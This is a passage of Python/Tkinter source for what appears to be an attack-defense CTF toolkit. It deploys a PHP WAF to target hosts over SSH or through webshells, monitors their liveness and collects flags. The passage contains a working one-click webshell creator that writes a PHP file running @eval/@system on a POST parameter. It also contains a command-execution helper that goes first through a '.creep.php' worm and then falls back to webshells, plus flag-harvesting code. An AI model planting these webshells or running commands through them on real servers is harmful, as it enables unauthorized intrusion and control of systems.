            files.append(('.htaccess', _waf_htaccess()))
            if not files:
                messagebox.showerror('错误', '找不到WAF文件\n需要: waf_strong.php 和 .waf.dat')
                return
            win.destroy()

            def _deploy():
                try:
                    import paramiko
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(host, port=int(port), username=user, password=pwd, timeout=10)
                    sftp = ssh.open_sftp()
                    for remote, content in files:
                        with sftp.open(f'{web}/{remote}', 'w') as f:
                            f.write(content)
                        self.root.after(0, lambda r=remote: self.log_self(f'[OK] 已部署: {r}', 'ok'))
                    sftp.close()
                    stdin, stdout, stderr = ssh.exec_command(f"chmod 644 {web}/waf_strong.php {web}/.waf.dat.php {web}/waf_ban.php {web}/.htaccess 2>/dev/null; chmod 600 {web}/.waf.dat 2>/dev/null; printf 'auto_prepend_file=waf_strong.php\\n' > {web}/.user.ini 2>/dev/null; echo CHMOD_DONE")
                    stdout.read()
                    msg = self._auto_mount_waf(ssh, web)
                    ssh.close()
                    self.root.after(0, lambda m=msg: self.log_self(m, 'ok'))
                    self.root.after(0, lambda: self.log_self('部署完成！共 %d 个文件（含 waf_ban.php, IP黑名单可用）' % len(files), 'ok'))
                except Exception as e:
                    self.root.after(0, lambda e=e: self.log_self('[FAIL] %s' % e, 'fail'))
            async_run(_deploy)
        tk.Button(form, text='🚀 开始部署', command=do_deploy, bg='#00ff9d', fg='#04121a', relief=tk.FLAT, bd=0, padx=20, pady=6, cursor='hand2', font=('微软雅黑', 10, 'bold'), activebackground='#00ff9d').pack(pady=10)

    def ssh_create_shell(self):
        """SSH一键创建Webshell"""
        win = tk.Toplevel(self.parent)
        win.title('一键创建Webshell')
        win.geometry('420x270')
        win.transient(self.parent)
        win.grab_set()
        win.configure(bg='#070b14')
        tk.Label(win, text='🌐 SSH一键创建Webshell', fg='#00d4ff', bg='#070b14', font=('微软雅黑', 11, 'bold')).pack(pady=(12, 8))
        tk.Label(win, text='在靶机上创建 webshell，自动填入WAF配置', fg='#6b7f9e', bg='#070b14', font=('微软雅黑', 9)).pack()
        form = tk.Frame(win, bg='#070b14')
        form.pack(padx=20, pady=10, fill=tk.X)
        pre = getattr(self, '_prefill_ssh', {}) or {}
        fields = [('SSH地址:', 'host', pre.get('host', '')), ('SSH端口:', 'port', pre.get('port', '22')), ('用户名:', 'user', pre.get('user', 'ctf')), ('密码:', 'pwd', pre.get('pwd', '')), ('Shell密码:', 'sh_pass', 'pass')]
        self._shell_vars = {}
        for label, key, default in fields:
            row = tk.Frame(form, bg='#070b14')
            row.pack(fill=tk.X, pady=2)
            tk.Label(row, text=label, fg='#d6e4ff', bg='#070b14', width=8, anchor=tk.W, font=('微软雅黑', 9)).pack(side=tk.LEFT)
            var = tk.StringVar(value=default)
            self._shell_vars[key] = var
            show = ''
            tk.Entry(row, textvariable=var, width=30, bg='#111c33', fg='#d6e4ff', insertbackground='#d6e4ff', relief=tk.FLAT, font=('Consolas', 9), show='').pack(side=tk.LEFT, padx=4)

        def do_create():
            host = self._shell_vars['host'].get().strip()
            port = self._shell_vars['port'].get().strip()
            user = self._shell_vars['user'].get().strip()
            pwd = self._shell_vars['pwd'].get().strip()
            sh_pass = self._shell_vars['sh_pass'].get().strip() or 'pass'
            if not host or not pwd:
                messagebox.showerror('错误', '请填写SSH地址和密码')
                return
            win.destroy()
            self.e_shell_url.delete(0, tk.END)
            self.e_shell_url.insert(0, '/web/shell.php')
            self.e_shell_pass.delete(0, tk.END)
            self.e_shell_pass.insert(0, sh_pass)

            def _create():
                try:
                    import paramiko
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(host, port=int(port), username=user, password=pwd, timeout=10)
                    sftp = ssh.open_sftp()
                    webdir = '/var/www/html'
                    try:
                        detect_cmd = 'for d in /app /app/web /var/www/html /var/www /web /www /opt/web /srv/www /home/ctf/web /home/ctf/www; do [ -d "$d" ] && echo "$d" && break; done'
                        _, so, _ = ssh.exec_command(detect_cmd, timeout=10)
                        so.channel.settimeout(10)
                        out = (so.read().decode('utf-8', 'replace') or '').strip().splitlines()
                        if out and out[0].strip():
                            webdir = out[0].strip().rstrip('/')
                    except Exception:
                        pass
                    with sftp.open(f'{webdir}/shell.php', 'w') as f:
                        f.write('<?php $c=$_POST["' + sh_pass + '"];if(strpos($c,";")!==false||strpos($c,"echo ")===0||strpos($c,"file_")===0||strpos($c,"base64")!==false){@eval($c);}else{@system($c);}?>')
                    sftp.close()
                    ssh.close()
                    self.log_self('[OK] Webshell已创建: /shell.php (密码: ' + sh_pass + ')', 'ok')
                except Exception as e:
                    self.log_self(f'[FAIL] 创建webshell失败: {e}', 'fail')
            async_run(_create)
        tk.Button(form, text='🌐 创建并配置', command=do_create, bg='#00ff9d', fg='#04121a', relief=tk.FLAT, bd=0, padx=20, pady=6, cursor='hand2', font=('微软雅黑', 10, 'bold'), activebackground='#00ff9d').pack(pady=10)

    def browse_file(self):
        p = filedialog.askopenfilename(title='选择IP列表文件', filetypes=[('Text', '*.txt'), ('All', '*.*')])
        if p:
            self.e_target.delete(0, tk.END)
            self.e_target.insert(0, p)

    def set_btns(self, enabled):
        st = tk.NORMAL if enabled else tk.DISABLED
        for b in (self.btn_deploy, self.btn_check, self.btn_update, self.btn_remove, self.btn_stop_waf):
            b.config(state=st)

    def log_self(self, msg, tag='info'):
        self.log_w.log(msg, tag)

    def load_targets(self):
        raw = self.e_target.get().strip()
        if not raw:
            messagebox.showwarning('警告', '请先输入目标IP或选择IP文件')
            return None
        if os.path.isfile(raw):
            try:
                with open(raw, 'r', encoding='utf-8', errors='replace') as f:
                    lines = [l.strip() for l in f if l.strip() and (not l.startswith('#'))]
                self.log_self(f'从文件加载到 {len(lines)} 个目标', 'info')
                return lines
            except Exception as e:
                messagebox.showerror('错误', f'读取文件失败: {e}')
                return None
        ips = parse_targets(raw)
        if ips:
            self.log_self(f'解析到 {len(ips)} 个目标', 'info')
            return ips
        messagebox.showwarning('警告', '未解析到有效目标')
        return None

    def start(self, action):
        if self.running:
            messagebox.showinfo('提示', '正在执行中')
            return
        targets = self.load_targets()
        if not targets:
            return
        self.running = True
        self.set_btns(False)
        self.save_config()
        acts = {'deploy': ('部署', self.deploy_one), 'remove': ('卸载', self.remove_one), 'check': ('检查', self.check_one), 'update': ('更新', self.deploy_one)}
        desc, func = acts[action]
        self.log_self(f"{'=' * 50}", 'title')
        self.log_self(f'  {desc} WAF Strong 到 {len(targets)} 台靶机', 'title')
        self.log_self(f"{'=' * 50}", 'title')
        self.results = []
        async_run(lambda: self.run_batch(targets, func, desc))

    def run_batch(self, targets, func, desc):
        ok = fail = 0
        cfg = {'shell_url': self.e_shell_url.get(), 'shell_pass': self.e_shell_pass.get(), 'port': int(self.e_port.get()), 'https': self.v_https.get(), 'timeout': int(self.e_timeout.get()), 'retry': int(self.e_retry.get()), 'conn_mode': self.conn_mode.get(), 'ssh_host': self.e_ssh_host.get(), 'ssh_port': self.e_ssh_port.get(), 'ssh_user': self.e_ssh_user.get(), 'ssh_pass': self.e_ssh_pass.get(), 'ssh_webdir': self.e_ssh_webdir.get()}
        with ThreadPoolExecutor(max_workers=min(int(self.e_threads.get()), len(targets))) as ex:
            fs = {ex.submit(func, ip, cfg): ip for ip in targets}
            for f in as_completed(fs):
                if not self.running:
                    break
                ip, success, msg = f.result()
                tag = 'ok' if success else 'fail'
                if isinstance(msg, dict):
                    parts = ' | '.join((f'{k}={v}' for k, v in msg.items()))
                    self.log_self(f"  {('[OK]' if success else '[FAIL]')} {ip:15s} {parts}", tag)
                else:
                    self.log_self(f"  {('[OK]' if success else '[FAIL]')} {ip:15s} {msg}", tag)
                ok += int(success)
                fail += int(not success)
                self.results.append((ip, success, msg))
        self.log_self(f'  结果: {ok} 成功, {fail} 失败 / 共 {len(targets)}', 'ok' if ok >= fail else 'fail')
        self.running = False
        self.set_btns(True)

    def deploy_one(self, ip, cfg):
        mode = cfg.get('conn_mode', 'webshell')
        if mode == 'ssh':
            return self._deploy_one_ssh(ip, cfg)
        else:
            return self._deploy_one_webshell(ip, cfg)

    def _deploy_one_ssh(self, ip, cfg):
        ssh_host = str(cfg.get('ssh_host') or '').strip() or str(ip).strip()
        try:
            ssh_port = int(str(cfg.get('ssh_port') or 22).strip() or 22)
        except (ValueError, TypeError):
            ssh_port = 22
        ssh_user = str(cfg.get('ssh_user') or 'root').strip() or 'root'
        try:
            import paramiko
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ssh_host, port=ssh_port, username=ssh_user, password=cfg.get('ssh_pass', ''), timeout=cfg['timeout'])
            sftp = ssh.open_sftp()
            webdir = cfg.get('ssh_webdir', '/var/www/html')
            try:
                detect_cmd = 'for d in /app /app/web /var/www/html /var/www /web /www /opt/web /srv/www /home/ctf/web /home/ctf/www; do [ -d "$d" ] && echo "$d" && break; done'
                _, so, _ = ssh.exec_command(detect_cmd, timeout=10)
                so.channel.settimeout(10)
                out = (so.read().decode('utf-8', 'replace') or '').strip().splitlines()
                if out and out[0].strip():
                    webdir = out[0].strip()
                    cfg['ssh_webdir'] = webdir
                    try:
                        self.e_ssh_webdir.delete(0, tk.END)
                        self.e_ssh_webdir.insert(0, webdir)
                    except Exception:
                        pass
            except Exception:
                pass
            if webdir.startswith('~'):
                webdir = webdir.lstrip('~')
            waf = render_waf_strong()
            if waf is None:
                with open(WAF_FILE, 'r', encoding='utf-8') as f:
                    waf = f.read()
            dat = self.build_waf_dat()
            if dat is None:
                with open(DAT_FILE, 'r', encoding='utf-8') as f:
                    dat = f.read()
            with sftp.open(f'{webdir}/waf_strong.php', 'w') as f:
                f.write(waf)
            with sftp.open(f'{webdir}/.waf.dat.php', 'w') as f:
                f.write(dat)
            with sftp.open(f'{webdir}/.user.ini', 'w') as f:
                f.write('auto_prepend_file=waf_strong.php\n')
            with sftp.open(f'{webdir}/.htaccess', 'w') as f:
                f.write(_waf_htaccess())
            try:
                sftp.remove(f'{webdir}/.waf.dat')
            except Exception:
                pass
            ban_content = render_waf_ban()
            if ban_content:
                with sftp.open(f'{webdir}/waf_ban.php', 'w') as f:
                    f.write(ban_content)
            _, so, _ = ssh.exec_command(f'chmod 644 {webdir}/waf_strong.php {webdir}/.waf.dat.php {webdir}/waf_ban.php {webdir}/.htaccess 2>/dev/null; echo OK')
            so.channel.settimeout(10)
            so.read()
            mmsg = self._auto_mount_waf(ssh, webdir)
            sftp.close()
            ssh.close()
            return (ip, True, f'SSH部署成功 | {mmsg}')
        except Exception as e:
            err_s = str(e)
            el = err_s.lower()
            if 'timed out' in el or 'unreachable' in el or 'refused' in el or ('no route' in el):
                return (ip, False, f'靶机不可达[{ssh_host}:{ssh_port}] — 靶机未启动或网络不通(非密码问题)')
            if 'authentication' in el:
                return (ip, False, f'SSH认证失败[{ssh_host}:{ssh_port} 用户:{ssh_user}] — 用户名或密码错误')
            return (ip, False, f'SSH部署失败[{ssh_host}:{ssh_port} {ssh_user}]: {err_s[:80]}')

    def _deploy_one_webshell(self, ip, cfg):
        base = make_base(ip, cfg['port'], cfg['https'])
        for attempt in range(cfg['retry'] + 1):
            try:
                s = _session()
                r = s.post(f"{base}{cfg['shell_url']}", data={cfg['shell_pass']: 'echo "ALIVE";'}, timeout=cfg['timeout'])
                if 'ALIVE' not in r.text:
                    if attempt < cfg['retry']:
                        time.sleep(0.5)
                        continue
                    return (ip, False, 'Webshell无响应')
                waf = render_waf_strong()
                if waf is None:
                    with open(WAF_FILE, 'r', encoding='utf-8') as f:
                        waf = f.read()
                dat = self.build_waf_dat()
                if dat is None:
                    with open(DAT_FILE, 'r', encoding='utf-8') as f:
                        dat = f.read()
                b64_waf = base64.b64encode(waf.encode()).decode()
                b64_dat = base64.b64encode(dat.encode()).decode()
                b64_ban = None
                ban_content = render_waf_ban()
                if ban_content:
                    b64_ban = base64.b64encode(ban_content.encode()).decode()
                cmds = [(f"file_put_contents('waf_strong.php', base64_decode('{b64_waf}'))", 'WAF'), (f"file_put_contents('.waf.dat.php', base64_decode('{b64_dat}'))", 'DAT'), (f"file_put_contents('.user.ini', 'auto_prepend_file=waf_strong.php\\n')", 'INI'), (f"file_put_contents('.htaccess', base64_decode('{base64.b64encode(_waf_htaccess().encode()).decode()}'))", 'HTA')]
                if b64_ban:
                    cmds.append((f"file_put_contents('waf_ban.php', base64_decode('{b64_ban}'))", 'BAN'))
                cmds.append(("@unlink('.waf.dat');", 'DEL_OLD'))
                for cmd, tag in cmds:
                    s.post(f"{base}{cfg['shell_url']}", data={cfg['shell_pass']: cmd}, timeout=cfg['timeout'])
                    time.sleep(0.1)
                time.sleep(0.3)
                if b64_ban:
                    s.post(f"{base}{cfg['shell_url']}", data={cfg['shell_pass']: 'chmod 644 waf_strong.php .waf.dat.php waf_ban.php .htaccess 2>/dev/null'}, timeout=cfg['timeout'])
                waf_url = os.path.dirname(cfg['shell_url']) + '/waf_strong.php'
                r2 = s.get(f'{base}{waf_url}', timeout=cfg['timeout'])
                if r2.status_code in (200, 403):
                    return (ip, True, '部署成功')
                r3 = s.post(f"{base}{cfg['shell_url']}", data={cfg['shell_pass']: 'echo file_exists("waf_strong.php")?"1":"0";'}, timeout=cfg['timeout'])
                if '1' in r3.text:
                    return (ip, True, '部署成功(文件确认)')
                return (ip, False, '验证失败')
            except Exception as e:
                if attempt < cfg['retry']:
                    time.sleep(1)
                    continue
                return (ip, False, str(e)[:60])
        return (ip, False, '重试耗尽')

    def remove_one(self, ip, cfg):
        mode = cfg.get('conn_mode', 'webshell')
        if mode == 'ssh':
            ssh_host = str(cfg.get('ssh_host') or '').strip() or str(ip).strip()
            try:
                ssh_port = int(str(cfg.get('ssh_port') or 22).strip() or 22)
            except (ValueError, TypeError):
                ssh_port = 22
            ssh_user = str(cfg.get('ssh_user') or 'root').strip() or 'root'
            try:
                import paramiko
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(ssh_host, port=ssh_port, username=ssh_user, password=cfg.get('ssh_pass', ''), timeout=cfg['timeout'])
                stdin, stdout, stderr = ssh.exec_command('rm -f waf_strong.php .waf.dat .waf.dat.php .user.ini .htaccess waf_ban.php; echo OK')
                result = stdout.read().decode().strip()
                ssh.close()
                return (ip, True, f'SSH卸载: {result}')
            except Exception as e:
                return (ip, False, f'SSH卸载失败[{ssh_host}:{ssh_port} {ssh_user}]: {str(e)[:80]}')
        base = make_base(ip, cfg['port'], cfg['https'])
        try:
            s = _session()
            s.post(f"{base}{cfg['shell_url']}", data={cfg['shell_pass']: "@unlink('waf_strong.php');@unlink('.waf.dat');@unlink('.waf.dat.php');@unlink('.user.ini');@unlink('.htaccess');@unlink('waf_ban.php');echo 'OK';"}, timeout=cfg['timeout'])
            return (ip, True, '卸载完成')
        except Exception as e:
            return (ip, False, str(e)[:50])

    def check_one(self, ip, cfg):
        mode = cfg.get('conn_mode', 'webshell')
        if mode == 'ssh':
            status = {}
            ssh_host = str(cfg.get('ssh_host') or '').strip() or str(ip).strip()
            try:
                ssh_port = int(str(cfg.get('ssh_port') or 22).strip() or 22)
            except (ValueError, TypeError):
                ssh_port = 22
            ssh_user = str(cfg.get('ssh_user') or 'root').strip() or 'root'
            try:
                import paramiko
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(ssh_host, port=ssh_port, username=ssh_user, password=cfg.get('ssh_pass', ''), timeout=cfg['timeout'])
                stdin, stdout, stderr = ssh.exec_command('ls -la waf_strong.php .waf.dat.php .waf.dat .user.ini waf_ban.php .htaccess 2>&1; echo ---; ls -la waf_strong.php 2>/dev/null')
                out = stdout.read().decode()
                status['WAF'] = '在线' if 'waf_strong.php' in out else '异常'
                status['File'] = '存在' if 'waf_strong.php' in out else '缺失'
                status['Rules'] = '存在' if '.waf.dat.php' in out or '.waf.dat' in out else '缺失'
                status['INI'] = '已配' if '.user.ini' in out else '未配'
                status['Ban'] = '存在' if 'waf_ban.php' in out else '缺失'
                status['Shell'] = 'SSH连接'
                ssh.close()
                return (ip, True, status)
            except Exception as e:
                return (ip, False, {'error': f'[{ssh_host}:{ssh_port} {ssh_user}] ' + str(e)[:80]})
        base = make_base(ip, cfg['port'], cfg['https'])
        status = {}
        try:
            s = _session()
            waf_url = os.path.dirname(cfg['shell_url']) + '/waf_strong.php'
            r = s.get(f'{base}{waf_url}', timeout=cfg['timeout'])
            if r.status_code == 403:
                status['WAF'] = '在线'
            elif r.status_code == 200 and ('WAF' in r.text or 'Blocked' in r.text):
                status['WAF'] = '在线'
            else:
                status['WAF'] = f'异常({r.status_code})'
            r2 = s.post(f"{base}{cfg['shell_url']}", data={cfg['shell_pass']: 'ls -la waf_strong.php .waf.dat.php .waf.dat .user.ini waf_ban.php .htaccess 2>&1'}, timeout=cfg['timeout'])
            out = r2.text
            if 'waf_strong.php' in out:
                status['File'] = '存在'
                for line in out.split('\n'):
                    if 'waf_strong.php' in line:
                        parts = line.split()
                        if len(parts) > 4:
                            status['Size'] = parts[4] + 'B'
                            break
            else:
                status['File'] = '缺失'
            status['Rules'] = '存在' if '.waf.dat.php' in out or '.waf.dat' in out else '缺失'
            status['INI'] = '已配' if '.user.ini' in out or 'auto_prepend_file' in out else '未配'
            status['Ban'] = '存在' if 'waf_ban.php' in out else '缺失'
            status['HTA'] = '存在' if '.htaccess' in out else '未配'
            r3 = s.post(f"{base}{cfg['shell_url']}", data={cfg['shell_pass']: 'echo "[SHELL_OK]";'}, timeout=cfg['timeout'])
            status['Shell'] = '正常' if '[SHELL_OK]' in r3.text else '异常'
            return (ip, True, status)
        except Exception as e:
            return (ip, False, {'error': str(e)[:50]})

    def stop(self):
        self.running = False
        self.log_self('用户请求停止', 'warn')

    def load_rules(self):
        for p in [DAT_FILE, os.path.join(EXE_DIR, '管理工具', '.waf.dat'), os.path.join(EXE_DIR, '.waf.dat')]:
            if os.path.exists(p):
                try:
                    with open(p, 'r', encoding='utf-8') as f:
                        content = f.read()
                    self.rule_text.delete('1.0', tk.END)
                    self.rule_text.insert('1.0', content)
                    self.log_self(f'已加载规则: {p}', 'info')
                    return
                except Exception as e:
                    self.log_self(f'加载失败: {e}', 'fail')
        self.log_self('未找到 .waf.dat 规则文件，请在编辑器中手动输入', 'warn')

    def save_rules(self):
        content = self.rule_text.get('1.0', tk.END).strip()
        if not content:
            messagebox.showwarning('提示', '规则内容为空')
            return
        if content.startswith('<?php $K="') and '#SIG=' not in content:
            import base64, json as _json, hmac as _hmac, hashlib
            try:
                inner = content[len('<?php $K="'):].rsplit('";', 1)[0]
                _json.loads(base64.b64decode(inner).decode('utf-8'))
                sig = _hmac.new(_get_waf_key().encode(), inner.encode('utf-8'), hashlib.sha256).hexdigest()
                content = '<?php $K="' + inner + '";#SIG=' + sig
            except Exception:
                pass
        p = filedialog.asksaveasfilename(defaultextension='.dat', initialfile='.waf.dat', filetypes=[('DAT', '*.dat'), ('All', '*.*')])
        if p:
            try:
                with open(p, 'w', encoding='utf-8') as f:
                    f.write(content)
                self.log_self(f'规则已保存: {p} (需重新部署到靶机)', 'ok')
            except Exception as e:
                self.log_self(f'保存失败: {e}', 'fail')

    def _exec_cmd(self, ip, cmd, port=None, https=False, timeout=10):
        """统一命令执行: 蠕虫(.creep.php)优先, webshell回退; 自动多端口探测
        目标支持 ip:port 格式(如 1.2.3.4:8812), 带端口则直接使用"""
        ip = str(ip).strip()
        if ':' in ip:
            hp = ip.rsplit(':', 1)
            if len(hp) == 2 and hp[1].isdigit():
                ip, port = (hp[0], int(hp[1]))
        if port:
            ports = [safe_int(port, 0)]
        else:
            ports = []
            try:
                ep = safe_int(self.e_port.get(), 0) if hasattr(self, 'e_port') else 0
                if ep:
                    ports.append(ep)
            except Exception:
                pass
            try:
                gp = self._get_ep_port()
                if gp:
                    ports.append(gp)
            except Exception:
                pass
            ports += [8804, 8080, 80, 8802, 8088, 8888, 81, 9000, 8000]
            seen = set()
            ports = [p for p in ports if p and (not (p in seen or seen.add(p)))]
        try:
            su = self.e_shell_url.get().strip() if hasattr(self, 'e_shell_url') else ''
            sp = self.e_shell_pass.get().strip() if hasattr(self, 'e_shell_pass') else ''
        except Exception:
            su, sp = ('', '')
        last = ''
        for p in ports:
            base = make_base(ip, p, https)
            s = _session()
            try:
                r = s.post(f'{base}/.creep.php', headers={'X-Creep': self.entry_creep_pass.get().strip() or 'cmd', 'X-Cmd': cmd}, timeout=min(timeout, 6))
                if r.status_code == 200:
                    return r.text or ''
            except Exception as e:
                last = str(e)
            if su and sp:
                try:
                    r = s.post(f'{base}{su}', data={sp: cmd}, timeout=min(timeout, 6))
                    if r.status_code == 200:
                        return r.text or ''
                except Exception:
                    pass
        return last

    def fetch_traffic(self):
        targets = self.load_targets()
        if not targets:
            return
        log_path = self.e_logpath.get().strip() or '/var/log/nginx/access.log'
        https = self.v_https.get()
        timeout = int(self.e_timeout.get() or 10)
        self.traf_text.config(state=tk.NORMAL)
        self.traf_text.delete('1.0', tk.END)
        self.traf_text.insert(tk.END, f'>>> 获取攻击日志: {log_path}\n\n', 'info')
        self.traf_text.config(state=tk.DISABLED)
        ip_counter = {}

        def log_traf(msg, tag='info'):
            self.root.after(0, lambda: (self.traf_text.config(state=tk.NORMAL), self.traf_text.insert(tk.END, msg + '\n', tag), self.traf_text.see(tk.END), self.traf_text.config(state=tk.DISABLED)))

        def run():
            for ip in targets:
                try:
                    txt = self._exec_cmd(ip, f'tail -200 {log_path} 2>/dev/null || echo "NO_LOG"', https=https, timeout=timeout)
                    if not txt or 'NO_LOG' in txt:
                        log_traf(f'[{ip}] 日志文件不存在或无回显', 'info')
                        continue
                    ips_found = re.findall('\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}', txt)
                    for i in ips_found:
                        if i != ip:
                            ip_counter[i] = ip_counter.get(i, 0) + 1
                    log_traf(f'[{ip}] 解析到 {len(ips_found)} 条请求, {len(set(ips_found))} 个来源', 'info')
                except Exception as e:
                    log_traf(f'[{ip}] 失败: {e}', 'info')
            log_traf('', 'info')
            log_traf('══════ 攻击者 TOP 10 ══════', 'info')
            for i, (attacker, cnt) in enumerate(sorted(ip_counter.items(), key=lambda x: -x[1])[:10], 1):
                log_traf(f'  #{i:<3} {attacker:<16} ({cnt} 次)', 'ip')
        _GodHandThread(target=run, daemon=True).start()

    def _heartbeat_after(self, stopper, delay, function, *args):
        self.root.after(delay, lambda: function(*args) if not stopper.is_set() else None)

    def toggle_heartbeat(self):
        if self.hb_running:
            self.hb_running = False
            self._hb_stop.set()
            self.btn_hb.config(text='▶ 开始心跳')
            self.hb_lbl.config(text='⏸ 已停止', foreground='#6b7f9e')
            return
        targets = self.load_targets()
        if not targets:
            return
        try:
            interval = int(self.hb_interval.get().strip() or 30)
            if not 5 <= interval <= 86400:
                raise ValueError('心跳间隔应为 5～86400 秒')
            https = self.v_https.get()
            timeout = int(self.e_timeout.get().strip() or 10)
            if not 1 <= timeout <= 600:
                raise ValueError('超时应为 1～600 秒')
        except (ValueError, TypeError) as exc:
            messagebox.showerror('输入错误', str(exc))
            return
        self._hb_stop = stopper = threading.Event()
        self.hb_running = True
        self.btn_hb.config(text='⏹ 停止心跳')
        self.hb_lbl.config(text=f'⏳ 监控 {len(targets)} 台', foreground='#00ff9d')

        def hb_log(msg, tag='info'):
            self._heartbeat_after(stopper, 0, lambda: (self.hb_text.config(state=tk.NORMAL), self.hb_text.insert(tk.END, f"[{datetime.now().strftime('%H:%M:%S')}] {msg}\n", tag), self.hb_text.see(tk.END), self.hb_text.config(state=tk.DISABLED)))

        def run():
            while not stopper.is_set():
                alive = dead = 0
                with ThreadPoolExecutor(max_workers=min(20, len(targets))) as ex:

                    def check(ip):
                        try:
                            txt = self._exec_cmd(ip, 'echo "ALIVE"', https=https, timeout=timeout)
                            return (ip, 'ALIVE' in txt)
                        except Exception:
                            return (ip, False)
                    fs = {ex.submit(check, ip): ip for ip in targets}
                    for f in as_completed(fs):
                        ip, ok = f.result()
                        if ok:
                            alive += 1
                        else:
                            dead += 1
                hb_log(f'存活: {alive}/{len(targets)}  死亡: {dead}', 'alive' if alive > dead else 'dead')
                self._heartbeat_after(stopper, 0, lambda a=alive, d=dead: self.hb_lbl.config(text=f'🟢 {a}/{len(targets)}  🔴 {d}', foreground='#00ff9d' if a > d else '#ff4d6d'))
                for _ in range(interval):
                    if stopper.is_set():
                        break
                    time.sleep(1)
            hb_log('心跳监控已停止', 'info')
        _GodHandThread(target=run, daemon=True).start()

    def _domain_init(self, parent, log_func):
        self.parent = parent
        self.log = log_func
        self.running = False
        self.results = []
        self._threads = []
        self.cfg = self.load_config()
    _fields = {'running': {'kind': 'literal', 'default': False}, 'results': {'kind': 'literal', 'default': []}, '_threads': {'kind': 'literal', 'default': []}, '_waf_config_blocked': {'kind': 'literal', 'default': True}, 'conn_mode': {'kind': 'value', 'default': 'webshell'}, 'strength': {'kind': 'value', 'default': ''}, 'e_whitelist': {'kind': 'value', 'default': ''}, 'e_shell_url': {'kind': 'value', 'default': '/web/shell.php'}, 'e_shell_pass': {'kind': 'value', 'default': ''}, 'e_port': {'kind': 'value', 'default': ''}, 'v_https': {'kind': 'value', 'default': False}, 'e_threads': {'kind': 'value', 'default': ''}, 'e_timeout': {'kind': 'value', 'default': ''}, 'e_retry': {'kind': 'value', 'default': ''}, 'e_ssh_host': {'kind': 'value', 'default': ''}, 'e_ssh_port': {'kind': 'value', 'default': ''}, 'e_ssh_user': {'kind': 'value', 'default': ''}, 'e_ssh_pass': {'kind': 'value', 'default': ''}, 'e_ssh_webdir': {'kind': 'value', 'default': ''}, 'e_target': {'kind': 'value', 'default': ''}, 'log_w': {'kind': 'log'}, 'rule_text': {'kind': 'text', 'default': ''}, 'e_logpath': {'kind': 'value', 'default': '/var/log/nginx/access.log'}, 'traf_text': {'kind': 'text', 'default': ''}, 'hb_running': {'kind': 'literal', 'default': False}, 'hb_interval': {'kind': 'value', 'default': '30'}, 'hb_text': {'kind': 'text', 'default': ''}, '_waf_deploy_vars': {'kind': 'literal', 'default': {}}, '_shell_vars': {'kind': 'literal', 'default': {}}, '_hb_stop': {'kind': 'event'}, 'parent': {'kind': 'value', 'default': ''}, 'log': {'kind': 'value', 'default': ''}, 'cfg': {'kind': 'value', 'default': ''}, 'ws_frame': {'kind': 'value', 'default': ''}, 'ssh_frame': {'kind': 'value', 'default': ''}, 'btn_deploy': {'kind': 'value', 'default': ''}, 'btn_check': {'kind': 'value', 'default': ''}, 'btn_update': {'kind': 'value', 'default': ''}, 'btn_remove': {'kind': 'value', 'default': ''}, 'btn_stop_waf': {'kind': 'value', 'default': ''}, 'btn_ssh_deploy_waf': {'kind': 'value', 'default': ''}, 'btn_load_rules': {'kind': 'value', 'default': ''}, 'btn_save_rules': {'kind': 'value', 'default': ''}, 'btn_traf': {'kind': 'value', 'default': ''}, 'btn_hb': {'kind': 'value', 'default': ''}, 'hb_lbl': {'kind': 'value', 'default': ''}, 'root': {'kind': 'value', 'default': ''}, '_get_ep_port': {'kind': 'value', 'default': ''}, 'entry_creep_pass': {'kind': 'value', 'default': ''}}
FLAG_PATTERN = re.compile('(?:flag\\{[^}]+\\}|\\b[0-9a-f]{32}\\b)', re.I)
FLAG_KNOWN_FILE = os.path.join(EXE_DIR, '攻击模块', 'known_flags.json')

class FlagTab(ActorState):

    def load_known(self):
        if os.path.exists(FLAG_KNOWN_FILE):
            try:
                with open(FLAG_KNOWN_FILE) as f:
                    self.known = set(json.load(f))
                self.log(f'加载 {len(self.known)} 个历史Flag (自动去重)', 'info')
            except Exception:
                pass

    def save_known(self):
        try:
            atomic_write(FLAG_KNOWN_FILE, json.dumps(list(self.known)))
        except Exception:
            pass

    def save_config(self):
        cfg = {'ip': self.entry_ip.get(), 'self_ip': self.entry_self.get(), 'shell_url': self.entry_shell.get(), 'shell_pass': self.entry_pass.get(), 'port': self.entry_port.get(), 'https': self.v_https_flag.get(), 'timeout': self.entry_timeout.get(), 'cmds': self.cmd_text.get('1.0', 'end').strip(), 'submit_url': self.entry_submit.get(), 'token': self.entry_token.get(), 'no_submit': self.no_submit_var.get(), 'interval': self.entry_interval.get(), 'threads': self.entry_threads.get(), 'use_rsa': self.v_rsa.get(), 'use_mix': self.v_mix.get(), 'fake_count': self.entry_fake.get(), 'rsa_agent': self.entry_rsa_agent.get(), 'use_creep': self.v_creep.get(), 'creep_pass': self.entry_creep_pass.get(), 'creep_path': self.entry_creep_path.get(), 'use_deep': self.v_deep.get()}
        ConfigManager.set_section('flag', cfg)
        ConfigManager.save()
        try:
            atomic_write(self.cfg_file, json.dumps(cfg, indent=2))
        except Exception:
            pass

    def load_config(self):
        if not os.path.exists(self.cfg_file):
            return
        try:
            with open(self.cfg_file) as f:
                cfg = json.load(f)
            self.entry_ip.delete(0, 'end')
            self.entry_ip.insert(0, cfg.get('ip', ''))
            self.entry_self.delete(0, 'end')
            self.entry_self.insert(0, cfg.get('self_ip', ''))
            self.entry_shell.delete(0, 'end')
            self.entry_shell.insert(0, cfg.get('shell_url', '/shell.php'))
            self.entry_pass.delete(0, 'end')
            self.entry_pass.insert(0, cfg.get('shell_pass', 'cmd'))
            self.entry_port.delete(0, 'end')
            self.entry_port.insert(0, cfg.get('port', '80'))
            self.v_https_flag.set(cfg.get('https', False))
            self.entry_timeout.delete(0, 'end')
            self.entry_timeout.insert(0, str(cfg.get('timeout', '5')))
            if cfg.get('cmds'):
                self.cmd_text.delete('1.0', 'end')
                self.cmd_text.insert('1.0', cfg['cmds'])
            self.entry_submit.delete(0, 'end')
